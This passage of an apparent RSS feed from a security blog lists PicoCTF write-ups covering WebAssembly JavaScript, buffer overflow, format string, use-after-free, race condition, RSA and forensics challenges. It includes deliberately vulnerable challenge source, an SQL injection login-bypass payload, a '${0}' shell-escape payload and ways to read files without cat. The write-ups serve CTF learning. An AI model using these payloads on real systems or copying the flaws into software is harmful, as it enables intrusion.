const list_str = ['copy_char', 'value', '207aLjBod', '1301420SaUSqf', '233ZRpipt', '2224QffgXU', 'check_flag', '408533hsoVYx', 'instance', '278338GVFUrH', 'Correct!', '549933ZVjkwI', 'innerHTML', 'charCodeAt', './aD8SvhyVkb', 'result', '977AzKzwq', 'Incorrect!', 'exports', 'length', 'getElementById', '1jIrMBu', 'input', '615361geljRK']; const func1_cal = function(var_a, var_b) { var_a = var_a - 195; let list_strc4 = list_str[var_a]; return list_strc4; }; (function(var_a, var_b) { const func1_cal = func1_cal; while (!![]) { try { const var_c = -parseInt(func1_cal(200)) * -parseInt(func1_cal(201)) + -parseInt(func1_cal(205)) + parseInt(func1_cal(207)) + parseInt(func1_cal(195)) + -parseInt(func1_cal(198)) * parseInt(func1_cal(212)) + parseInt(func1_cal(203)) + -parseInt(func1_cal(217)) * parseInt(func1_cal(199)); if (var_c === var_b) break; else var_a['push'](var_a['shift']()); } catch (_0x4f8a) { var_a['push'](var_a['shift']()); } } }(list_str, 310022)); let exports; (async () => { const func1_cal = func1_cal; let res_1 = await fetch(func1_cal(210)), res_2 = await WebAssembly['instantiate'](await res_1['arrayBuffer']()), res_3 = res_2[func1_cal(204)]; exports = res_3[func1_cal(214)]; })(); function onButtonPress() { const func1_cal = func1_cal; let res_1 = document[func1_cal(216)](func1_cal(218))[func1_cal(197)]; for (let idx = 0; idx &lt; res_1['length']; idx++) { exports[func1_cal(196)](res_1[func1_cal(209)](idx), idx); } exports['copy_char'](0, res_1[func1_cal(215)]), exports[func1_cal(202)]() == 1 ? document['getElementById'](func1_cal(211))[func1_cal(208)] = func1_cal(206) : document[func1_cal(216)](func1_cal(211))['innerHTML'] = func1_cal(213); } :::</description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</guid><description>PicoCTF - Some Assembly Required 3 Background WebAssembly/wabt
$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c Source code :::spoiler rTEuOmSfG3.js
'use strict'; const str_list = ["exports", "270328ewawLo", "instantiate", "1OsuamQ", "Incorrect!", "length", "copy_char", "value", "1512517ESezaM", "innerHTML", "check_flag", "result", "1383842SQRPPf", "924408cukzgO", "getElementById", "418508cLDohp", "input", "Correct!", "573XsMMHp", "arrayBuffer", "183RUQBDE", "38934oMACea"]; const tranfer_fn = function(url, whensCollection) { /** @type {number} */ url = url - 285; let _0x143f7d = str_list[url]; return _0x143f7d; }; (function(data, oldPassword) { const tranfer_fn = tranfer_fn; for (; !![];) { try { const userPsd = -parseInt("length") + -parseInt("573XsMMHp") + -parseInt("innerHTML") * -parseInt("getElementById") + -parseInt("38934oMACea") + parseInt("value") + -parseInt("Incorrect!") * -parseInt("instantiate") + parseInt("arrayBuffer"); if (userPsd === oldPassword) { break; } else { data["push"](data["shift"]()); } } catch (_0x289152) { data["push"](data["shift"]()); } } })(str_list, 970828); let exports; (async() => { const tranfer_fn = tranfer_fn; let rpm_traffic = await fetch("./qCCYI0ajpD"); let m = await WebAssembly["1512517ESezaM"](await rpm_traffic["1OsuamQ"]()); let updatedEdgesById = m["instance"]; exports = updatedEdgesById["copy_char"]; })(); /** * @return {undefined} */ function onButtonPress() { const tranfer_fn = tranfer_fn; let data = document["183RUQBDE"]("exports")["924408cukzgO"]; for (let i = 0; i &lt; data["result"]; i++) { exports["1383842SQRPPf"](data["charCodeAt"](i), i); } exports["1383842SQRPPf"](0, data["result"]); if (exports["input"]() == 1) { document["183RUQBDE"]("Correct!")["418508cLDohp"] = "270328ewawLo"; } else { document["183RUQBDE"]("Correct!")["innerHTML"] = "check_flag"; } } ; :::</description></item><item><title>PicoCTF - Special &amp; Specialer</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html</guid><description>PicoCTF - Special &amp; Specialer tags: PicoCTF CTF General Skill Recon 這兩題都蠻有趣的，感覺打提權應該會用到，所以一起紀錄，第一題是要get shell，關於這一題我是直接看學長之前解題的WP，payload是${0}就直接拿到shell了，詳細的原理我也不清楚，第二題比較簡單，就直接用網路的資源替換一下ls, cat這兩個指令就拿到flag了
Exploit 代替cat的方法：
# Method 1 $ while read line; do while> echo $line; while> done &lt;{filename}} # Method 2 $ exec 3&lt;{filename}} # Assign file descriptor 3 for reading $ while read -u 3 line; do while> echo $line while> done # Method 3 $ echo "$(&lt;{filename})" 代替ls的方法
# Method 1 $ echo * # Method 2 $ echo */* # Method 3 $ echo * .* # Method 4 $ dir # Method 5 $ printf '%s\n' * # Method 6 $ grep -l '.*' ./* # Method 7 $ find . # Method 8 $ stat -c '%s %A %n' * # Method 9 $ lsattr ./* # Method 10 $ vim . Reference Cat without cat on the commandline Alternatives to the ’ls’ command to list the contents of a directory</description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</guid><description>PicoCTF - SQLiLite tags: PicoCTF CTF Web Challenge: http://saturn.picoctf.net:55837/
Exploit - sqli Payload: admin' or '1'='1' -- #</description></item><item><title>PicoCTF - SRA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html</guid><description>PicoCTF - SRA tags: PicoCTF CTF Crypto Source code :::spoiler Source Code
from Crypto.Util.number import getPrime, inverse, bytes_to_long from string import ascii_letters, digits from random import choice pride = "".join(choice(ascii_letters + digits) for _ in range(16)) gluttony = getPrime(128) greed = getPrime(128) lust = gluttony * greed sloth = 65537 envy = inverse(sloth, (gluttony - 1) * (greed - 1)) anger = pow(bytes_to_long(pride.encode()), sloth, lust) print(f"{anger = }") print(f"{envy = }") print("vainglory?") vainglory = input("> ").strip() if vainglory == pride: print("Conquered!") with open("/challenge/flag.txt") as f: print(f.read()) else: print("Hubris!") :::</description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</guid><description>PicoCTF - stack cache Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 16 #define FLAGSIZE 64 #define INPSIZE 10 /* This program is compiled statically with clang-12 without any optimisations. */ void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = "Enter names"; // *q = "Name 1"; // *r = "Name 2"; unsigned long *age; printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents); printf("Names of user: %p %p %p\n", p,q,r); printf("Age of user: %p\n",age); fflush(stdout); } void vuln(){ char buf[INPSIZE]; printf("Give me a string that gets you the flag\n"); gets(buf); printf("%s\n",buf); return; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); printf("Bye!"); return 0; } :::</description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</guid><description>PicoCTF - Stonk Market Background FMT
Source code :::spoiler
#include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;string.h> #include &lt;time.h> #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf("\nPortfolio as of "); fflush(stdout); system("date"); // TODO: implement this in C fflush(stdout); printf("\n\n"); Stonk *head = p->head; if (!head) { printf("You don't own any stonks!\n"); } while (head) { printf("%d shares of %s\n", head->shares, head->symbol); head = head->next; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares &lt; 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk->shares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i &lt;= MAX_SYM_LEN; i++) { if (i &lt; AI_symbol_len) { stonk->symbol[i] = 'A' + (rand() % 26); } else { stonk->symbol[i] = '\0'; } } stonk->next = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } /* char api_buf[FLAG_BUFFER]; FILE *f = fopen("api","r"); if (!f) { printf("Flag file not found\n"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); */ int money = p->money; int shares = 0; Stonk *temp = NULL; printf("Using patented AI algorithms to buy stonks\n"); while (money > 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp->next = p->head; p->head = temp; money -= shares; } printf("Stonks chosen\n"); char *user_buf = malloc(300 + 1); printf("What is your API token?\n"); scanf("%300s", user_buf); printf("Buying stonks with token:\n"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p->money = (rand() % 2018) + 1; p->head = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p->head; Stonk *next = NULL; while (current) { next = current->next; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf("Memory failure\n"); exit(1); } int resp = 0; printf("Welcome back to the trading app!\n\n"); printf("What would you like to do?\n"); printf("1) Buy some stonks!\n"); printf("2) View my portfolio\n"); scanf("%d", &amp;resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf("Goodbye!\n"); exit(0); } :::</description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</guid><description>PicoCTF - Super Serial tags: PicoCTF CTF Web Background php unserialization
Hint The flag is at ../flag Recon 這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化
robot.txt 一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析 index.phps 用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php :::spoiler Real Source Code
&lt;?php require_once("cookie.php"); if(isset($_POST["user"]) &amp;&amp; isset($_POST["pass"])){ $con = new SQLite3("../users.db"); $username = $_POST["user"]; $password = $_POST["pass"]; $perm_res = new permissions($username, $password); if ($perm_res->is_guest() || $perm_res->is_admin()) { setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"); header("Location: authentication.php"); die(); } else { $msg = '&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'; } } ?> &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"> &lt;link href="style.css" rel="stylesheet"> &lt;script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;div class="row"> &lt;div class="col-sm-9 col-md-7 col-lg-5 mx-auto"> &lt;div class="card card-signin my-5"> &lt;div class="card-body"> &lt;h5 class="card-title text-center">Sign In&lt;/h5> &lt;?php if (isset($msg)) echo $msg; ?> &lt;form class="form-signin" action="index.php" method="post"> &lt;div class="form-label-group"> &lt;input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus> &lt;label for="user">Username&lt;/label> &lt;/div> &lt;div class="form-label-group"> &lt;input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required> &lt;label for="pass">Password&lt;/label> &lt;/div> &lt;button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in&lt;/button> &lt;/form> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - Surfing the Waves</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html</guid><description>PicoCTF - Surfing the Waves tags: PicoCTF CTF Misc Challenge: Surfing the Waves
Description &amp; Hint While you’re going through the FBI’s servers, you stumble across their incredible taste in music. One main.wav you found is particularly interesting, see if you can find the flag! Hint:
Music is cool, but what other kinds of waves are there? Look deep below the surface Exploit - 通靈 Audacity to Analyze The sound seems quite normal but when you zoom in the audio track, it looks like something encode. Read it - scipy.io Use scipy.io library to read it and print the data out. >>> from scipy.io.wavfile import read >>> rate, data = read("./main.wav") >>> print(data) [2007 2503 2005 ... 4503 4501 7501] >>> import numpy as np >>> print(np.unique(data)) [1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1500 1501 1502 1503 1504 1505 1506 1507 1508 1509 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2500 2501 2502 2503 2504 2505 2506 2507 2508 2509 3000 3001 3002 3003 3004 3005 3006 3007 3008 3009 3500 3501 3502 3503 3504 3505 3506 3507 3508 3509 4000 4001 4002 4003 4004 4005 4006 4007 4008 4009 4500 4501 4502 4503 4504 4505 4506 4507 4508 4509 5000 5001 5002 5003 5004 5005 5006 5007 5008 5009 5500 5501 5502 5503 5504 5505 5506 5507 5508 5509 6000 6001 6002 6003 6004 6005 6006 6007 6008 6009 6500 6501 6502 6503 6504 6505 6506 6507 6508 6509 7000 7001 7002 7003 7004 7005 7006 7007 7008 7009 7500 7501 7502 7503 7504 7505 7506 7507 7508 7509 8000 8001 8002 8003 8004 8005 8006 8007 8008 8009 8500 8501 8502 8503 8504 8505 8506 8507 8508 8509] Seems it has some rule $\to$ 1000 ~ 1009 1500 ~ 1509 2000 ~ 2009 … 8500 ~ 8509 It has exactly 16 intervals $\to$ hex value Let’s try to exploit it Whole exploit :::spoiler exploit from scipy.io.wavfile import read from tqdm import trange path = '.' rate, data = read(path + "/main.wav") decode_dic = { 10 : "0", 15 : "1", 20 : "2", 25 : "3", 30 : "4", 35 : "5", 40 : "6", 45 : "7", 50 : "8", 55 : "9", 60 : "A", 65 : "B", 70 : "C", 75 : "D", 80 : "E", 85 : "F", } message = '' for i in trange(len(data)): message += decode_dic[data[i] // 100] print(bytes.fromhex(message).decode()) ::: Then you can get the source code and flag… Reference picoCTF 2021 Surfing the Waves</description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</guid><description>PicoCTF - tic-tac Background 後端工程師面試考什麼 - Race Condition 篇 [Day24]攻擊篇 TOCTTOU
Time of check to time of use 在檢查和使用之間影響資源狀態的攻擊
這種攻擊可能發生在共享資源中。 可能導致程式在資源處於意外狀態時執行無效操作。
Source code :::spoiler Source code
#include &lt;iostream> #include &lt;fstream> #include &lt;unistd.h> #include &lt;sys/stat.h> int main(int argc, char *argv[]) { if (argc != 2) { std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " &lt;filename>" &lt;&lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file's status information. if (stat(filename.c_str(), &amp;statbuf) == -1) { std::cerr &lt;&lt; "Error: Could not retrieve file information" &lt;&lt; std::endl; return 1; } // Check the file's owner. if (statbuf.st_uid != getuid()) { std::cerr &lt;&lt; "Error: you don't own this file" &lt;&lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout &lt;&lt; line &lt;&lt; std::endl; } } else { std::cerr &lt;&lt; "Error: Could not open file" &lt;&lt; std::endl; return 1; } return 0; } :::</description></item><item><title>PicoCTF - Torrent Analyze</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html</guid><description>PicoCTF - Torrent Analyze Background What are seeds, peers and leechers in Torrents’ language? 慎選peer，是加速BT下載的王道！
seed個數：seed（即一般所說的「種子」）意指擁有完整檔案的BT參與者，是主要的檔案提供者。seed越多，可用的BT分享頻寬就越多，速度當然就快。 seed與peer的比例：雖然peer（指尚未取得完整檔案的BT參與者）可同時自seed與其他peer下載檔案，但peer間會彼此競爭，以爭取有限的BT下載頻寬。因此，peer個數越多，分配後的BT分享頻寬就越少，速度自然就受影響。 教你該如何使用bt的info hash特徵碼，下載BT之torrent種子檔
Description &amp; Hint SOS, someone is torrenting on our network. One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}. Hint 1: Download and open the file with a packet analyzer like Wireshark. Hint 2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -> Enabled Protocols Hint 3: Try to understand peers, leechers and seeds. Article Hint 4: The file name ends with .iso</description></item><item><title>PicoCTF - Transformation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</guid><description>PicoCTF - Transformation tags: PicoCTF CTF Reverse Challenge: Transformation
Source code enc file content: 灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽 Transformation Code
''.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) Seems it shift the first character with 8 bits and concatenate the 2nd character then go through len(flag)
Exploit My perspective is just recover the strings :::spoiler
flag = '灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽' enc = '' def decimalToBinary(n): return bin(n).replace("0b", "") def binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = ['0'] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp &lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = '' while i >= 0: hex_string += hexaDeciNum[i] i = i-1 return hex_string for i in range(0, len(flag)): plaintext1 = decimalToBinary(ord(flag[i])) while(len(plaintext1) != 16): plaintext1 = '0' + plaintext1 plaintext2 = plaintext1[-8:] plaintext1 = plaintext1[0:8] enc += binToHexa(plaintext1) enc += binToHexa(plaintext2) print(bytes.fromhex(enc).decode('utf-8')) :::</description></item><item><title>PicoCTF - Trivial Flag Transfer Protocol</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html</guid><description>PicoCTF - Trivial Flag Transfer Protocol tags: PicoCTF CTF Misc Challenge: Trivial Flag Transfer Protocol
Background TFTP協定是什麼？
Wireless router中的UPnP是做什麼用的?
UPnP 是一種通訊協定，其主要功能是供家中的設備可以輕易的且自動的連結到網路並完成網路相關設定。 不需要您本人手動去設定就可以使用的意思。 所以你的 router 有支援並打開這項功能後，您家中的視訊設備（大部分都是支援UPnP）接上網路、打開電源。 接著你的 作業系統也支援的話，以winodws 為例，「我的電腦」中就會看到您新增的設備，如無線router、media server等等。
SSDP - 通訊協定 ?
SSDP的全寫是「Simple Service Discovery Protocol」，使用在Universal Plug and Play (UPnP)網絡環境中。SSDP使用UDP1900連接埠搜尋互聯網上的數據。當SSDP開啟時，其他設置會曝露自己到所有UPnP的用戶端中。
steghide instruction
Exploit - TFTP + steghide Save files According to the article: TFTP協定是什麼？, we can aware that this protocol is aim to transfer the data without authentication. So, we can download the files using wireshark.</description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</guid><description>PicoCTF - two-sum Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> static int addIntOvf(int result, int a, int b) { result = a + b; if(a > 0 &amp;&amp; b > 0 &amp;&amp; result &lt; 0) return -1; if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result > 0) return -1; return 0; } int main() { int num1, num2, sum; FILE *flag; char c; printf("n1 > n1 + n2 OR n2 > n1 + n2 \n"); fflush(stdout); printf("What two positive numbers can make this possible: \n"); fflush(stdout); if (scanf("%d", &amp;num1) &amp;&amp; scanf("%d", &amp;num2)) { printf("You entered %d and %d\n", num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) { printf("No overflow\n"); fflush(stdout); exit(0); } else if (addIntOvf(sum, num1, num2) == -1) { printf("You have an integer overflow\n"); fflush(stdout); } if (num1 > 0 || num2 > 0) { flag = fopen("flag.txt","r"); if(flag == NULL){ printf("flag not found: please run this on the server\n"); fflush(stdout); exit(0); } char buf[60]; fgets(buf, 59, flag); printf("YOUR FLAG IS: %s\n", buf); fflush(stdout); exit(0); } } return 0; } :::</description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</guid><description>PicoCTF - Unsubscriptions Are Free Background Heap Exploitation / Used After Free
Source code :::spoiler Source Code
#include &lt;stdint.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;ctype.h> #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr(){ char buf[FLAG_BUFFER]; FILE *f = fopen("flag.txt","r"); fgets(buf,FLAG_BUFFER,f); fprintf(stdout,"%s\n",buf); fflush(stdout); } char * getsline(void) { getchar(); char * line = malloc(100), * linep = line; size_t lenmax = 100, len = lenmax; int c; if(line == NULL) return NULL; for(;;) { c = fgetc(stdin); if(c == EOF) break; if(--len == 0) { len = lenmax; char * linen = realloc(linep, lenmax *= 2); if(linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if((*line++ = c) == '\n') break; } *line = '\0'; return linep; } void doProcess(cmd* obj) { (*obj->whatToDo)(); } void s(){ printf("OOP! Memory leak...%p\n",hahaexploitgobrrr); puts("Thanks for subsribing! I really recommend becoming a premium member!"); } void p(){ puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)"); } void m(){ puts("Account created."); } void leaveMessage(){ puts("I only read premium member messages but you can "); puts("try anyways:"); char* msg = (char*)malloc(8); read(0, msg, 8); } void i(){ char response; puts("You're leaving already(Y/N)?"); scanf(" %c", &amp;response); if(toupper(response)=='Y'){ puts("Bye!"); free(user); }else{ puts("Ok. Get premium membership please!"); } } void printMenu(){ puts("Welcome to my stream! ^W^"); puts("=========================="); puts("(S)ubscribe to my channel"); puts("(I)nquire about account deletion"); puts("(M)ake an Twixer account"); puts("(P)ay for premium membership"); puts("(l)eave a message(with or without logging in)"); puts("(e)xit"); } void processInput(){ scanf(" %c", &amp;choice); choice = toupper(choice); switch(choice){ case 'S': if(user){ user->whatToDo = (void*)s; }else{ puts("Not logged in!"); } break; case 'P': user->whatToDo = (void*)p; break; case 'I': user->whatToDo = (void*)i; break; case 'M': user->whatToDo = (void*)m; puts("==========================="); puts("Registration: Welcome to Twixer!"); puts("Enter your username: "); user->username = getsline(); break; case 'L': leaveMessage(); break; case 'E': exit(0); default: puts("Invalid option!"); exit(1); break; } } int main(){ setbuf(stdout, NULL); user = (cmd *)malloc(sizeof(user)); while(1){ printMenu(); processInput(); //if(user){ doProcess(user); //} } return 0; } :::</description></item><item><title>PicoCTF - Very Smooth</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html</guid><description>PicoCTF - Very Smooth tags: PicoCTF CTF Crypto Background $p-1$ Smooth
Source code :::spoiler Source Code
#!/usr/bin/python from binascii import hexlify from gmpy2 import * import math import os import sys if sys.version_info &lt; (3, 9): math.gcd = gcd math.lcm = lcm _DEBUG = False FLAG = open('flag.txt').read().strip() FLAG = mpz(hexlify(FLAG.encode()), 16) SEED = mpz(hexlify(os.urandom(32)).decode(), 16) STATE = random_state(SEED) def get_prime(state, bits): return next_prime(mpz_urandomb(state, bits) | (1 &lt;&lt; (bits - 1))) def get_smooth_prime(state, bits, smoothness=16): p = mpz(2) p_factors = [p] while p.bit_length() &lt; bits - 2 * smoothness: factor = get_prime(state, smoothness) p_factors.append(factor) p *= factor bitcnt = (bits - p.bit_length()) // 2 while True: prime1 = get_prime(state, bitcnt) prime2 = get_prime(state, bitcnt) tmpp = p * prime1 * prime2 if tmpp.bit_length() &lt; bits: bitcnt += 1 continue if tmpp.bit_length() > bits: bitcnt -= 1 continue if is_prime(tmpp + 1): p_factors.append(prime1) p_factors.append(prime2) p = tmpp + 1 break p_factors.sort() return (p, p_factors) e = 0x10001 while True: p, p_factors = get_smooth_prime(STATE, 1024, 16) if len(p_factors) != len(set(p_factors)): continue # Smoothness should be different or some might encounter issues. q, q_factors = get_smooth_prime(STATE, 1024, 17) if len(q_factors) != len(set(q_factors)): continue factors = p_factors + q_factors if e not in factors: break if _DEBUG: import sys sys.stderr.write(f'p = {p.digits(16)}\n\n') sys.stderr.write(f'p_factors = [\n') for factor in p_factors: sys.stderr.write(f' {factor.digits(16)},\n') sys.stderr.write(f']\n\n') sys.stderr.write(f'q = {q.digits(16)}\n\n') sys.stderr.write(f'q_factors = [\n') for factor in q_factors: sys.stderr.write(f' {factor.digits(16)},\n') sys.stderr.write(f']\n\n') n = p * q m = math.lcm(p - 1, q - 1) d = pow(e, -1, m) c = pow(FLAG, e, n) print(f'n = {n.digits(10)}') print(f'c = {c.digits(10)}') :::</description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</guid><description>PicoCTF - VNE Background System Environment Command Injection
Description &amp; Hint We’ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named “bin” once connected. Login as ctf-player with the password, d137d16e
Hint 1: Have you checked the content of the /root folder Hint 2: Find a way to add more instructions to the ls Source Code :::spoiler IDA Main Function</description></item><item><title>PicoCTF - WebNet0</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html</guid><description>PicoCTF - WebNet0 Background 解密TLS協議全記錄之利用wireshark解密
Recon 這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了
